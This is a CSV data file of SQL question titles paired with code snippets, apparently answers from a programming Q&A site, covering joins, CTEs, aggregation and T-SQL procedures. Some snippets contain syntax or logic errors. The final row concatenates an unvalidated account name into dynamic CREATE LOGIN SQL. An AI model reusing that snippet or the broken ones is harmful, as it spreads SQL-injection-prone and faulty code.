14330,53339,How to use SDO_JOIN to find if one object is inside another,"SELECT ci.city, ci.state_abrv, co.county
  FROM us_cities ci,
       us_counties co,
       TABLE(SDO_JOIN(
             'US_COUNTIES', 'GEOM',
             'US_CITIES', 'LOCATION',
             'MASK=INSIDE') 
       ) j
WHERE j.rowid1 = ci.rowid
  AND j.rowid2 = co.rowid
ORDER BY ci.city, ci.state_abrv;
"
35584,30003,Differences between 3 table,"select ipaddress, HostName,
    SUM(case when tbl = 'a' then 1 else 0 end) tablea, 
    SUM(case when tbl = 'b' then 1 else 0 end) tableb,
    SUM(case when tbl = 'c' then 1 else 0 end) tablec
from
(
    select ipaddress, HostName, 'a' tbl
    from tablea
    union all
    select ipaddress, HostName, 'b' tbl
    from tableb
    union all
    select ipaddress, HostName, 'c' tbl
    from tablec
) d
group by ipaddress, HostName;
"
12959,40200,How to select rows which are evenly distributed on some column?,"      select Y.c1, Y.c2, Y.c3
      from
      (
      select c1, c2, c3.... from X limit 500 order by rand()
      ) as Y
      where Y.c2 in ( 'imp1', 'imp2', 'imp3')
      limit 10
"
1672,51913,SQL: highest order center for each customer,"WITH cte_centers AS
(SELECT DISTINCT cusid FROM orderdb)
SELECT cte_centers.cusid, x.numofcenter
FROM cte_centers 
CROSS APPLY
(SELECT TOP 1 
    count(centerid) numofcenter
 FROM orderdb
 WHERE isnumeric (cusid)=1
    AND estimate=0
    AND orderdb.cusid = cte_centers.cusid
 GROUP BY centered, cusid
 ORDER BY count(centerid) DESC
)x
"
19794,38597,how to change the beginning position of the field in sql loader,"...
(
skip_1     FILLER,
skip_2     FILLER,
skip_3     FILLER,
skip_4     FILLER,
skip_5     FILLER,
nickname1,
nickname2,
class      CONSTANT '10',
Address    CONSTANT 'NA'
)
"
13632,70893,How to write this sql to make it to be understood easily,"FROM  BusLine AS BusLine_1 
    INNER JOIN Area AS Area_1 
        ON BusLine_1.AreaID = Area_1.ID 
    INNER JOIN BusInfo AS BusInfo_1 
        ON BusLine_1.ID = BusInfo_1.BusLineID 
    INNER JOIN BusStation AS BusStation_1 
        ON BusInfo_1.ID = BusStation_1.BusInfoID 
    INNER JOIN BusStation 
        ON BusStation_1.StationIndex > BusStation.StationIndex
    INNER JOIN BusInfo 
        ON BusInfo.ID = BusStation.BusInfoID AND BusInfo_1.ID = BusInfo.ID
    INNER JOIN BusLine 
        ON BusLine.ID = BusInfo.BusLineID 
    INNER JOIN Area 
        ON Area.ID = BusLine.AreaID 
WHERE  (Area.City = 'NewYork') 
"
36974,19283,How do I edit a .db file like if it was a real database that was running?,"using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Data.SQLite;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

 namespace Spiceworks_console 
{ 
class DBControl 
{ 
#region SpiceWorks 
SQLiteConnection m_SpiceWorksConnection;

 public bool ConnOpenSpiceWorks() 
{ 
try 
{ 
m_SpiceWorksConnection = new SQLiteConnection(""Data Source=C:\\Program Files (x86)\\Spiceworks\\db\\spiceworks_prod.db;Version=3;New=True;"");
 m_SpiceWorksConnection.Open(); 

Console.WriteLine(""Connected to SpiceWorks DB""); 
return true; 
} 
catch(Exception ex) 
{ 
Console.WriteLine(ex); 
return false; 
} 
}
"
16283,24115,How to sum based on multiple tables,"SELECT u.clan_id,
       sum(case when cv.type = 3 then cv.value else 0 end) as totalTime,
       sum(case when cv.type = 1 then cv.value else 0 end) as totalMass
FROM users u
INNER JOIN clan_values cv
 ON(u.id = cv.user_id)
GROUP BY u.clan_id
"
27648,21577,Write SQL to find more than 2 of the same occurence and their name,"select a.deptName, count(b.firstname) 
from departments a,
INNER JOIN  employees b ON a.deptID = b.dept
group by a.deptName
having count(b.firstname) >2;
"
19982,54860,sql oracle Union with null values,"select nvl(A, lag(A) over (order by rownum)), B, C from (
  select A, B, C from X
  union 
  select A, B, C from Y
)
"
18923,72762,Data export from SQL Server to Excel,"SELECT A.Col1, A.Col2, B.Country_Name,
FROM dbo.ChildTable A
INNER JOIN dbo.CountryTable B
  ON B.Id = A.Country_Id
"
200,27843,Timestamps and Intervals: NUMTOYMINTERVAL SYSTDATE CALCULATION SQL QUERY,"select date_id, 
       to_char(start_date, 'fmDay, Month DD, YYYY') as start_date,
       extract(year from numtoyminterval(months_between(trunc(sysdate), start_date), 'month') )
       || '-' ||
       extract(month from numtoyminterval(months_between(trunc(sysdate), start_date), 'month') )
       as years_and_months_since_start
  from your_table
 where to_char(start_date, 'MM/DD') = '02/28';
"
2343,19612,MySQL UPDATE with subquery with group by,"UPDATE Elements e
LEFT JOIN References r ON e.OneName = r.OtherName
SET e.referenced = r.OtherName IS NOT NULL;
"
27597,72826,hierararchy stucture in postgresql table,"select Parent,
       coalesce(child1, Parent) as child1,
       coalesce(child2, child1, Parent) as child2
from <tablename>;
"
4857,4615,Ormlite RawRowMapper truncated double,"GenericRawResults<Object[]> results =
        dao.queryRaw(dao.queryBuilder().selectColumns(""lat"")
            .prepareStatementString(), new DataType[] { DataType.DOUBLE });
CloseableIterator<Object[]> iterator = results.closeableIterator();
try {
    assertTrue(iterator.hasNext());
    Object[] objs = iterator.next();
    assertEquals(foo.doubleField, objs[0]);
} finally {
    iterator.close();
}
"
22560,33606,Combining two queries into one using Group By in MySQL,"    SELECT
        submissions.user_id,
        submissions.id,
        submissions.quote,
        submissions.filename,
        submissions.date_added,
        submissions.views,
        COUNT(comments.id) as `comment`,
        comments.submission_id

    FROM
        submissions
    LEFT JOIN
        comments
    ON
        submissions.id=comments.submission_id
    WHERE
        submissions.user_id = ?
    GROUP BY submissions.user_id,
        submissions.id,
        submissions.quote,
        submissions.filename,
        submissions.date_added,
        submissions.views,
        comments.submission_id
"
7537,71271,SQL - how hide duplicates Id,"select s.s_id, sc.c_id
from student s
left join stu_cour sc on sc.s_id = s.s_id and sc.c_id = 1
"
35999,63385,Merging multiple rows according to an order,"SELECT   a.Id,
         COALESCE(a.MachineName, t.MachineName) MachineName,
         COALESCE(a.WorkerName , t.WorkerName ) WorkerName,
         a.MachineState
FROM     myTable a JOIN (
           SELECT   Id,
                    MIN(MachineName) AS MachineName,
                    MIN(WorkerName ) AS WorkerName,
                    MAX(CASE MachineState
                      WHEN 'READY'   THEN 1
                      WHEN 'RUNNING' THEN 2
                      WHEN 'STOPPED' THEN 3
                    END) AS MachineState
           FROM     myTable
           GROUP BY Id
         ) t ON t.Id = a.Id AND t.MachineState = CASE a.MachineState
           WHEN 'READY'   THEN 1
           WHEN 'RUNNING' THEN 2
           WHEN 'STOPPED' THEN 3
         END
"
33030,54826,MySQL - Can we order by column position instead of name?,"ORDER BY 4
"
2503,40028,How to apply condition in case statement in then clouse,"SELECT sales_contract.contno, 
       sales_contract.date, 
       partymst.pname    AS PartyName, 
       customer.custname AS Customer, 
       itemmst.itname    AS ItemName, 
       sales_contract.grade, 
       sales_contract.rate, 
       sales_contract.weight
FROM   sales_contract 
       LEFT OUTER JOIN itemmst 
                    ON sales_contract.itcd = itemmst.itcd 
       LEFT OUTER JOIN customer 
                    ON sales_contract.customer = customer.custcd 
       LEFT OUTER JOIN partymst 
                    ON sales_contract.spartycd = partymst.partycd 
WHERE  ( @pending = 1 
         AND sales_contract.balweight > 0 ) 
        OR @pending <> 1
"
35766,62291,Select last 30 days with a sql query,";WITH CTE AS
(
    SELECT convert(date,GETDATE()) sDate, DATENAME(DW, GETDATE()) sDayofWeek
    UNION ALL
    SELECT DATEADD(DAY,-1,sDate), DATENAME(DW, DATEADD(DAY,-1,sDate))
    FROM CTE
    WHERE sDate > GETDATE()-29
)
SELECT * FROM CTE
"
33587,4903,How do you get a sum() twice from one table with different where clause?,"SELECT 
    sum(CASE WHEN pf = TRUE THEN qty ELSE 0 END) as accept,
    sum(CASE WHEN pf = FALSE THEN qty ELSE 0 END) as reject
FROM pile;
"
19336,37671,Join two queries together with default values of 0 if empty in Access,"SELECT original_staff_data.*, transaction_data_by_staff.total_rev, transaction_data_by_staff.total_profit
FROM transaction_data_by_staff RIGHT JOIN original_staff_data ON (transaction_data_by_staff.year = original_staff_data.year) AND (transaction_data_by_staff.month = original_staff_data.month)
AND (((transaction_data_by_staff.[staff_uid])=[original_staff_data].[staff_uid]));
"
39608,14830,How To Remove Null Values in SQL from Multiple columns?,"update tab
set Column1 = coalesce(Column1,'N/A'),
    Column2 = coalesce(Column2,'N/A'),  
    Column3 = coalesce(Column3,'N/A'), 
    Column4 = coalesce(Column4,'N/A')
"
20393,22826,Creating a View that returns the first occurrence of a value,"create view theview as
select 
  t1.s_id, min(dt) dt
from  
  table1 t1 inner join 
  table2 t2 on t1.s_id = t2.s_id
group by 
  t1.s_id
"
28219,63261,add specific multiple rows (SQL),"SELECT *
FROM (
    SELECT DISTINCT matchid, player1id, player2id FROM tbl
) AS t
CROSS APPLY(
    SELECT
        SUM(player1score), SUM(player2score)
    FROM tbl
    WHERE
        matchid = t.matchid
        AND player1id = t.player1id
        AND player2id = t.player2id
) AS x(player1score, player2score) 
"
14274,62588,Converting date to string SQL,"SELECT a.*
FROM xx a, xy b
WHERE a.payment_date = TO_DATE(b.check_date, 'mm/dd/yyyy')
"
21840,29267,Help me with my select query,"SELECT  ID,
        Student,
        ( SELECT TOP 1
                    ID
          FROM      dbo.table AS pT
          WHERE     pT.ID < T.ID And Active = 1
          ORDER BY  ID DESC
        ) AS PrevID,
        ( SELECT TOP 1
                    ID
          FROM      dbo.table AS pT
          WHERE     pT.ID > T.ID And Active = 1
          ORDER BY  ID
        ) AS NextID
FROM    dbo.table AS T
"
30986,36172,SQl Update from table of random Names,"update
TestNames left join 
(select ID,
floor(1+(rand()*600)) as rndid
from TestNames) as TN on TN.ID=TestNames.id
left join rndnames on TN.rndid=rndnames.id
set TestNames.fname=rndnames.FirstName,TestNames.lname=rndnames.LastName
"
13938,42444,How to return table from T-SQL Stored Procedure,"DECLARE @Table1 TABLE(
    	ID INT,
    	VAL int
)

INSERT INTO @Table1 (ID,VAL) SELECT 1, 1
INSERT INTO @Table1 (ID,VAL) SELECT 2, 2
INSERT INTO @Table1 (ID,VAL) SELECT 3, 3

DECLARE @Table2 TABLE(
    	ID INT,
    	VAL VARCHAR(MAX)
)

INSERT INTO @Table2 (ID,VAL) SELECT 1, 1
INSERT INTO @Table2 (ID,VAL) SELECT 2, 2
INSERT INTO @Table2 (ID,VAL) SELECT 3, 3

--Lets say this is the 2 tables


--now this will go into the sp
UPDATE  @Table1
SET 	Val = t1.Val + t2.Val
FROM    @Table1 t1 INNER JOIN
    	@Table2 t2 ON t1.ID = t2.ID

SELECT  t1.* 
FROM    @Table1 t1 INNER JOIN
    	@Table2 t2 ON t1.ID = t2.ID


--and you can insert into a var table in the tsql script that calls the sp

DECLARE @Table1TSQL TABLE(
    	ID INT,
    	VAL int
)

INSERT INTO @Table1TSQL (ID,VAL) EXEC YourSP
"
30055,50116,DateTime creation in T-SQL,"DECLARE @ref_day [datetime]
DECLARE @hours [varchar](15)
DECLARE @result [datetime]

SET @ref_day = '2015-10-06'
SET @hours = '07:30'

SET @result = DATEADD(day, DATEDIFF(day, 0, @ref_day), @hours)
"
22851,43687,Passing multiple values to a stored procedure from a dropdown listitem value,"     -- Start from first character 
     Set @Pos1=1
     Set @Pos2=1

     While @Pos1<Len(@CommaSperatedString)
     Begin
      Set @Pos1 = CharIndex(',',@CommaSperatedString,@Pos1)
      Insert @Tbl_Values Select  Cast(Substring(@CommaSperatedString,@Pos2,@Pos1-@Pos2) As varchar(500))
      -- Go to next non comma character
      Set @Pos2=@Pos1+1
      -- Search from the next charcater
      Set @Pos1 = @Pos1+1
     End 
End
"
6274,34892,How to query hierarchical information with SQL-Server 2000?,"/* Set up test data */
create table Folders (
    FolderID int,
    FolderName varchar(10),
    ParentID int
)

insert into Folders
    (FolderID, FolderName, ParentID)
    select 1,'Folder1',0 union all
    select 2,'Folder2',1 union all
    select 3,'Folder3',2 union all
    select 4,'Folder4',3        
go

/* Create function */
create function dbo.CreateFolderPath (@FolderID int)
returns varchar(1000)
as
begin
    declare @ParentID int
    declare @FolderPath varchar(1000)
    set @FolderPath = ''

    select @ParentID = ParentID
        from Folders
        where FolderID = @FolderID

    while @ParentID<>0 begin
        select @FolderPath = FolderName + '\' + @FolderPath, @ParentID = ParentID
            from Folders
            where FolderID = @ParentID
    end /* while */

    return @FolderPath
end /* function */
go

/* Demo the function */
select dbo.CreateFolderPath(4)

/* Clean up after demo */
drop function dbo.CreateFolderPath
drop table Folders
"
3026,24934,SQL SERVER 2008 Max Constant Value,"SELECT ClientID, YEAR, MIN(MONTH)
FROM table
WHERE NOT EXISTS (SELECT * 
    FROM table c 
    WHERE c.MONTH = table.MONTH + 1 
        AND c.ClientID = table.ClientID
        AND c.YEAR = table.YEAR)
GROUP BY ClientID, YEAR
"
12967,54385,How can I calculate a minimum number of A and B on mysql?,"LEAST()
"
38053,1074,SQL Server remove duplicate rows,"WITH Cte AS(
    SELECT *,
        rn = ROW_NUMBER() OVER(PARTITION BY car_license, repair_date ORDER BY repair_id)
    FROM car_table ct1
    WHERE EXISTS(
        SELECT 1
        FROM car_table ct2
        WHERE
            ct2.car_license = ct1.car_license
            AND ct2.mechanic_id = ct2.mechanic_id
            AND ct2.repair_date BETWEEN '20150201' AND '20150801'
            AND ct2.mechanic_id = 9
    )
)
SELECT * FROM CTE WHERE rn = 1
"
5907,67828,TSQL update date with today from datetimeoffset column,"DECLARE @date DATETIMEOFFSET = '2013-01-31 10:02:12 +02:00'

select @date,CONVERT(DATETIMEOFFSET, DATEADD(day, 18, @date))
"
32304,74,Generate test data using Oracle PL/SQL developer,"insert into emp(id, name, salary)
select rownum, 'Employee ' || to_char(rownum), dbms_random.value(2, 9) * 1000
from dual
connect by level <= 100;
"
2752,59809,How to use GROUP BY and COUNT in SQL in this scenario,"SELECT
    SUM(CASE WHEN q1 = 1 THEN 1 ELSE 0 END) as q1_first,
    SUM(CASE WHEN q1 = 2 THEN 1 ELSE 0 END) as q1_second,
    SUM(CASE WHEN q1 = 3 THEN 1 ELSE 0 END) as q1_third
FROM survey
"
21096,74388,SQLite grouping,"select a, count(distinct c), count(*) 
from xyz
group by a;
"
15397,56053,Visual Studio 2010 Design SQL automatically creates alias,"Tools -> Options -> Text Editor -> Transact-SQL -> IntelliSense
"
31966,6536,Retrieving data from specific columns of multiple rows in sql,"with t as (
    select ScheduleDate, Workarea, Employee1 as Employee, Hours1 as Hrs union all
    select ScheduleDate, Workarea, Employee2 as Employee, Hours2 as Hrs union all
    ...
    select ScheduleDate, Employee8 as Employee, Hours8 as Hrs
)
select ScheduleDate, Employee, sum(Hrs) as [Hours]
from t
group by ScheduleDate, Employee
having sum(Hrs) > 8
"
39011,5716,Loop through an explicit cursor in Oracle,"DECLARE      
  TYPE ref_cursor IS REF CURSOR;
  cur REF_CURSOR;

  d_item_no  items.item_no%TYPE;
  d_item_descr  items.item_descr%TYPE;

BEGIN
  OPEN cur FOR 'SELECT i.item_no, 
                       i.item_descr 
                  FROM ITEMS i 
                 WHERE i.item_no in (1,2,3)';
  LOOP
    FETCH cur INTO d_item_no, d_item_descr;
    EXIT WHEN cur%NOTFOUND;
    dbms_output.put_line( d_item_no||' '||d_item_descr );
  END LOOP;

  CLOSE cur;
END;
/
"
17866,4408,need to re-arrange data of sql table,"SELECT ID, Email, TM, UR
FROM TABLE
UNION
SELECT ID, EA1 Email, TM1 TM, UR1 UR
FROM TABLE
UNION
SELECT ID, '' Email, TM2 TM, UR2 UR
FROM TABLE
UNION
SELECT ID, '' Email, TM3 TM, UR3 UR
FROM TABLE
"
10589,6779,PostgreSQL: Sub-select inside insert,"INSERT INTO widgets
(
    map_id,
    widget_name
)
SELECT
    mt.map_id, 'Bupo'
FROM
    map_tags mt
WHERE
    mt.map_license = '12345'
"
16937,45474,Get values and like values in SQL,"select AccountNumber
from (select a.*, count(*) over (partition by ShortestAN) as numAN
      from (select a.*,
                   (select top 1 a2.AccountNumber
                    from accounts a2
                    where a.AccountNumber like a2.AccountNumber + '%'
                    order by length(a2.AccountNumber) asc
                   ) as ShortestAN
            from accounts a
           ) a
     ) a
where numAN > 1
order by ShortestAN, AccountNumber;
"
37788,70452,SQL Hierarchy Query,"SELECT ppse.SUBORDINATE_POSITION_ID child_position_id
           ,ppse.PARENT_POSITION_ID manger_position_id
           ,b.person_id
FROM per_pos_structure_elements_v ppse
  ,APPS.xxkpc_hr_personnel_v2_mv  b
WHERE b.position_id(+) = ppse.SUBORDINATE_POSITION_ID
AND b.type(+) = 'KPC Employee'
AND ppse.POS_STRUCTURE_VERSION_ID =64
AND ppse.PARENT_POSITION_ID=12493
AND 
(b.person_id!=null OR 
 ppse.SUBORDINATE_POSITION_ID in
             (SELECT SUBORDINATE_POSITION_ID from per_pos_structure_elements_v))
"
1792,10909,T-SQL Find char string and take all char to right of expression,"DECLARE @input NVarChar(1000) =
  'RJI#\\Cjserver\TrialWorks\CaseFiles\10000269\Pleadings\RJI - 10005781.doc',
        @match NVarChar(100) =
  '\\Cjserver';
DECLARE @position Int = CHARINDEX(@match, @input);

SELECT SUBSTRING(@input, @position, 1000);
"
28644,38480,Is there a way to avoid row deletion on an specific table using constrains or triggers?,"CREATE TABLE NoKillI (
  id INT NOT NULL, FOREIGN KEY (id) REFERENCES Accounts(id) ON DELETE RESTRICT
);
INSERT INTO NoKillI (id) VALUES (0);
INSERT INTO NoKillI (id) VALUES (1);
INSERT INTO NoKillI (id) VALUES (2);
"
5411,52658,Sum on subqueries on SQL Server,"SELECT ID, col1, col2, [Total] = (col1 + col2)
FROM (
    SELECT Id,
    (SELECT COUNT(*) FROM table1 LEFT JOIN table2 on ...) as col1,
    (SELECT COUNT(*) FROM table3 LEFT JOIN table4 on ...) as col2
    FROM [TABLE]) T
"
32552,21126,How to convert date in .csv file into SQL format before mass insertion,"LOAD DATA LOCAL INFILE 'c:/scheduletest.csv' INTO TABLE game
FIELDS TERMINATED BY ','
ENCLOSED BY '""'
LINES TERMINATED BY '\n'
(@DATE_STR, `time`, `awayteam_id`, `hometeam_id`)
SET `date` = STR_TO_DATE(@DATE_STR, '%c/%e/%Y');
"
12909,68010,Is there a better way to index multiple columns than creating an index for each permutation?,"a, b, c
b, c
c
"
21910,53482,How to perform count in access across three tables?,"SELECT category.id, count(topic.id), Nz(Sum(numofposts),0)
FROM (category LEFT JOIN (
    SELECT topic.id, count(post.id) as numofposts, topic.categoryId
    FROM topic LEFT JOIN post on topic.id = post.topicId
    GROUP BY topic.id, topic.categoryId
) as TP ON category.id=TP.categoryid)
GROUP BY category.id
"
1480,51117,How to simplify a repeatable pattern in SQL query?,"SELECT GREATEST(a,b) AS max_a_b 
FROM my_table 
HAVING max_a_b > 25
"
9992,43352,How to join those two tables in MySQL,"SELECT 
  `b`.`id` AS `ID`,
  `b`.`title` AS `Title`,
  mt1.meta_value `KeyOne`,
  mt2.meta_value `KeyTwo`,
  mt3.meta_value `KeyThree`
FROM 
  `base` as `b`
  LEFT JOIN `meta` mt1 ON b.id = mt1.base_id AND mt1.meta_key = 'key_one' 
  LEFT JOIN `meta` mt2 ON b.id = mt2.base_id AND mt2.meta_key = 'key_two' 
  LEFT JOIN `meta` mt3 ON b.id = mt3.base_id AND mt3.meta_key = 'key_three' 
"
36743,31437,"When one user function is altered, other user function doesn't return correct data","
CREATE FUNCTION [dbo].[fnTest] (
@a INT
, @b INT
)
RETURNS @data TABLE (
    A varchar(20),
    B varchar(20),
    C varchar(20)
    )
AS BEGIN
        INSERT INTO @data
        SELECT 'A' A, 'B' B, 'C' C
   RETURN
END;
GO

CREATE FUNCTION [dbo].[fnTest2] (
    @a INT
    , @b INT
    , @c VARCHAR(20)
    ) RETURNS TABLE
    AS
    RETURN SELECT * FROM dbo.fnTest(@a, @b) WHERE C = @c
    GO

    ALTER FUNCTION [dbo].[fnTest] (
    @a INT
    , @b INT
    )
RETURNS @data TABLE (
    A varchar(20),
    B varchar(20),
    C varchar(20),
    D varchar(20)
    )
AS BEGIN
        INSERT INTO @data
        SELECT 'A' A, 'B' B, 'C' C, 'D' D
    RETURN
END
GO

EXEC sys.sp_refreshsqlmodule 'dbo.fnTest2';
"
13540,12667,Oracle outer join on 3 tables,"select * 
from A 
   left outer join B on A.id = B.id
   left outer join C on C.id = B.id
"
34789,61451,Select 1 random record per category using sql,"select cat_group, id, cat_other
from (select mytable.*,
             row_number() over (partition by cat_group order by random()) as seqnum
      from mytable
     ) as t
where seqnum = 1
"
31120,49859,How to check between range of values of same column,"select
    g1.Courseid,
    g1.GradeValue MinGradeValue,
    isnull(min(g2.GradeValue)-1,100) MaxGradeValue,
    g1.Description
from YourTable g1
    left join YourTable g2
        ON g2.CourseId = g1.CourseId
        and g2.GradeValue > g1.GradeValue
group by
    g1.Courseid,
    g1.GradeValue,
    g1.Description
"
4940,26679,Set time interval as per given structure below,"DECLARE @mindate DATETIME
DECLARE @maxdate DATETIME

SET @mindate = '08:00 AM'
SET @maxdate = '05:00 PM'



;WITH cte(startDt, endDt)
AS
(  
    SELECT @mindate AS startDt, DATEADD(mi,10,@mindate) AS endDt 
    UNION ALL
    SELECT cte.endDt, DATEADD(mi,10,cte.endDt) FROM cte WHERE endDt < @maxdate
)
SELECT LTRIM(RIGHT(CONVERT(VARCHAR(20), startDt, 100), 7))+'-'+LTRIM(RIGHT(CONVERT(VARCHAR(20), endDt, 100), 7)) timerange, SUM(ISNULL(NoOfKeys,0))

FROM cte
LEFT JOIN Work w
ON w.WorkDateTime >= cte.StartDt AND w.WorkDateTime < cte.EndDt 
GROUP BY startDt, EndDt
option (maxrecursion 32767) 
"
33681,64104,How do I convert a daynumber (day nr 331) into yyyymmdd in PL/SQL?,"to_date(331, 'DDD')
"
9334,27715,How to select top when already selected fields,"select TOP 1 frp.ProductPersonID,frp.FlightSeatId, frp.PlusMealId,  per.TitleID,
"
20816,30367,Query to check whether the id exists in a table or not,"IF EXISTS (select * from TESTUSER where Var_LoggedInUser = @pLoggedUserId)
begin
  INSERT INTO TESTUSER (Var_LoggedInUser, Var_MappedUSer)
  VALUES (@pLoggedUserId, @pMappedUser)
end
ELSE
begin
  UPDATE TESTUSER   
  SET Var_MappedUSer = @pMappedUser 
  WHERE Var_LoggedInUser = @pLoggedUserId
end
"
27717,19390,JOIN / LEFT JOIN conflict in SQL Server,"SELECT refGroup.*
FROM tblSystemAdministratorGroups refGroup
JOIN tblGroup refMem ON refGroup.AttributeValue = refMem.ObjectUID
LEFT JOIN (
    select GroupObjectID, ID, max(ID) over (partition by ObjectID) as maxID
    from tblGroup_ComputedMember
) cm ON refMem.ObjectUID = cm.GroupObjectID and cm.ID = cm.maxID
LEFT JOIN (
    select GroupObjectID, ID, max(ID) over (partition by ObjectID) as maxID
    from tblGroup_ExplicitMember
) em ON refMem.ObjectUID = em.GroupObjectID and em.ID = em.maxID
where cm.ID = cm.MaxID
"
25796,66555,Find unique values that do not exist in multiple columns and tables,"select user.*
from user
left join hd_ticket on user.id = hd_ticket.owner_id
left join hd_ticket as hd_ticket2 on user.id = hd_ticket2.submitter_id
left join hd_archive_ticket on user.id = hd_archive_ticket.owner_id
left join hd_archive_ticket as hd_archive_ticket2 on user.id = hd_archive_ticket2.submitter_id
where hd_ticket.owner_id is null
and hd_ticket2.submitter_id is null
and hd_archive_ticket.owner_id is null
and hd_archive_ticket2.submitter_id is null
"
9828,13252,MySQL Union query duplicate/group by,"SELECT r.*
FROM Reports r
WHERE Modulo = 'Reports'
UNION ALL
SELECT rc.*
FROM Reports_Copy rc
WHERE Modulo = 'Reports' AND
      NOT EXISTS (SELECT 1 FROM REPORTS R WHERE RC.ID = R.ID);
"
20378,45744,groovy oracle result capital column name issue,"sql.rows('select * from people').each {
    People p = new People(it.collectEntries { k,v -> [k.toLowerCase(), v] })    
    println p.name
    println p.age
}
"
2640,49999,"PHP / MySQL question, more the latter","SELECT 
  CONCAT('Q', QUARTER(inv.duedate), ' ', YEAR(inv.duedate)) as quarter,
  SUM(inv.total) as total
FROM
  invoices inv
  LEFT JOIN clients cli ON inv.client_id = cli.id 
WHERE
  cli.country = 'CA'
GROUP BY
  quarter
"
35698,11983,SQL query for parent child with no relationship,"  create table #ordered_products
(id int identity(1,1),
 grouping int default 0,
 Description varchar(128),
 level int,
 is_active bit);

 insert into #ordered_products (Description, level, is_active)
 select description, level, is_active from products;

-- All rows now have an order

declare @grouping int = 0;
declare @currentid int;
declare @found bit = 1;
declare @level int;
declare @base int;

set @currentid = (select min(id) from #ordered_products);

-- Go through all the rows setting a new group each time we hit level 1

while (@found = 1)
begin
  set @level = (select level from #ordered_products where id = @currentid);

  if (@level = 1)
  begin
    set @grouping = @grouping + 1
  end

  update #ordered_products set grouping = @grouping where id = @currentid

  set @currentid = @currentid + 1;
  set @found = (select 1 from #ordered_products where id = @currentid);

end

-- For each group, set the children to be inactive if the parent is

declare @maxgroup int = (select MAX(GROUPING) from #ordered_products);

declare @currentgroup int = 1;

while (@currentgroup <= @maxgroup)
begin

    begin
        set @base = (select MIN(id) from #ordered_products where is_active = 0 and grouping = @currentgroup);

        if (@base > 0)
        begin
            update #ordered_products set is_active = 0 where grouping = @currentgroup and id > @base;
        end
    end 

    set @currentgroup = @currentgroup + 1;  
end 

-- Output

select * from #ordered_products where is_active = 1;

drop table #ordered_products;
"
9328,28587,Best practice for query to select a column twice,"SELECT C1.name, C2.name
FROM Concept C1
INNER JOIN concept_Relation CR 
  ON CR.FirstConceptID = C1.ID
INNER JOIN Concept C2 
  ON CR.SecondConceptID = C2.ID
WHERE CR.RelationID = 22
"
33593,45934,Select data from a table where only the first two columns are distinct,"select pk1, pk2, '11', max(c1), max(c2), max(c3) 
from table 
group by pk1, pk2 
"
28667,2062,joining multiple subqueries Oracle,"with tos 
as
(
SELECT tos1.source_system_order_id, 
       tos1.tos_date, 
       SUM(tos1.tos_final_charge_amt_sum) 
FROM   (SELECT source_system_order_id, 
               source_system_cd, 
               To_char(billing_month_dt, 'YYYYMM') AS TOS_Date, 
               tos_final_charge_amt_sum 
        FROM   tl_ov_stage 
        ORDER  BY source_system_order_id) TOS1 
GROUP  BY tos1.source_system_order_id, 
          tos1.tos_date 
), 
OES as
(
SELECT OES1.source_system_order_id, 
       oes1.oes_date, 
       SUM(oes1.oes_final_charge_amt_sum) AS OES_Final_Charge_Amt_Sum 
FROM   (SELECT To_char(""date"", 'YYYYMM')   AS OES_Date, 
               To_char(""service order id"") AS SOURCE_SYSTEM_ORDER_ID, 
               oes_final_charge_amt_sum 
        FROM   v_ord_valuation_detail@prodr_link) OES1 
GROUP  BY OES1.source_system_order_id, 
          oes1.oes_date, 
          oes1.order_status 
)
select tos.source_system_order_id, 
       tos.TOS_Date,  
       tos.TOS_Final_Charge_Amt_Sum, 
       oes.OES_Final_Charge_Amt_Sum
from tos
inner join oes
        on tos.source_system_order_id = oes.source_system_order_id
       AND tos.tos_date = oes.oes_date -- Remove if this is not needed
"
30153,59302,Insert into SELECT with composite primary key failing SQL Server 2008,"    with    drg as (SELECT DISTINCT patientID, admissionDate, dischargeDate, drgCode from largeTable)
    update  s
    set     s.drgCode = l.drgCode
    from    smallTable s join drg l on 
                s.patientId = l.patientId and
                s.admissionDate = l.admissionDate and
                s.dischargeDate  = l.dischargeDate
"
32996,74450,Sum of one column based on two columns of dynamically value,"SELECT itemcode,warehouse,SUM(qty) FROM yourtable
GROUP BY itemcode,warehouse
HAVING COUNT(*) > 1;
"
29511,52456,Listing procedure parameters in PL/SQL,"SELECT * FROM SYS.ALL_ARGUMENTS WHERE 
  PACKAGE_NAME = '<null_or_package_name>' AND 
  OBJECT_NAME = '<procedure_name>';
"
30682,11234,Count datasets grouped by a time span,"with cte as 
(select event, ts, row_number() over (partition by event order by ts) rn
 from myTable)
select t1.event, t1.ts
from cte t1
left join cte t2 
       on t2.event = t1.event and 
          t2.rn=t1.rn+1 and 
          t2.ts <= t1.ts + interval '5' second
where t2.event is null
"
28196,48638,SQL query to select minimum of 10 results,"SELECT * FROM 
(
    SELECT @rownum := @rownum + 1 AS rownum, name, read
    FROM notifications,
    (SELECT @rownum := 0) r  --initialise @rownum to 0
) t
WHERE read = 0 OR (read = 1 AND rownum <= 10)
ORDER BY rownum
"
4834,24464,Show all Children and Grandchildren in SQL Hierarchy CTE,"with cte as (
    select t.ChildId, t.ParentId, 0 as [Lvl]
    from @Table t
    where t.ParentId is not null
    union all
    select c.ChildId, t.ParentId, c.Lvl + 1
    from @Table t
        inner join cte c on c.ParentId = t.ChildId
    where t.ParentId is not null
)
select * from cte c order by c.ChildId, c.Lvl, c.ParentId;
"
25673,73824,What is the optimal way to compare dates in Microsoft SQL server?,"DECLARE @dateVar datetime = '19700204';

-- Quickest when there is an index on t.[DateColumn], 
-- because CONVERT can still use the index.
SELECT t.[DateColumn]
FROM MyTable t
WHERE = CONVERT(DATE, t.[DateColumn]) = CONVERT(DATE, @dateVar);

-- Quicker when there is no index on t.[DateColumn]
DECLARE @dateEnd datetime = DATEADD(DAY, 1, @dateVar);
SELECT t.[DateColumn] 
FROM MyTable t
WHERE t.[DateColumn] >= @dateVar AND 
      t.[DateColumn] < @dateEnd;
"
5562,33965,sql select biggest updated primary key,"DECLARE @UpdatedIDs TABLE
(
    ID INT
)

-- this statement may update multiple rows
Update Person
set name = 'sample name'
OUTPUT INSERTED.ID INTO @UpdatedIDs
where name = 'name' and lastname = 'lastname'
-- get last updated rowid here 

SELECT MAX(ID) AS LastUpdatedID
FROM @UpdatedIDs
"
26912,60033,SQL Gen'd login identifier,"DECLARE @sql nvarchar(200)

SET @sql = N'CREATE LOGIN ' + @aspAccountName + N' FROM WINDOWS WITH DEFAULT_DATABASE=[master]'

EXEC sp_executesql @sql
"
